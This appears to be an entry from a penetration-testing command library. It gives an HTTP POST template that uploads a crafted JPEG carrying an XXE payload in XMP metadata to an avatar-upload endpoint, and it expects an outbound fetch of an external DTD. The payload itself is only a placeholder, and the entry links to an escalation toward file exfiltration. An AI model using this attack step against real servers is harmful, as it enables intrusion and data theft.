---
data: POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
tags:
  - http
  - upload
type: command
executor: bash
platforms:
  - Web
id: 2148225d-25a0-40e3-a9f6-72ee75a0956a
created_at: '2025-12-13T09:00:33.672Z'
updated_at: '2025-12-13T09:00:33.672Z'
verified: false
validated: true
submitted: true
---
# POST Upload Image

## Command

```bash
POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="payload.jpg"

[JPEG content with XXE]
--boundary--
```

## Description

Uploads a crafted JPEG file with XXE payload in XMP metadata to trigger the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target host | Yes |
| `Content-Type` | Multipart form data | Yes |

## Examples

### Basic Usage

```bash
POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
Host: target.com
```

## Expected Output

Server processes the image and triggers outbound request to external DTD.

## Related

- [[procedures/Detect-XXE-in-File-Upload]]
- [[procedures/Escalate-XXE-to-File-Exfiltration]]
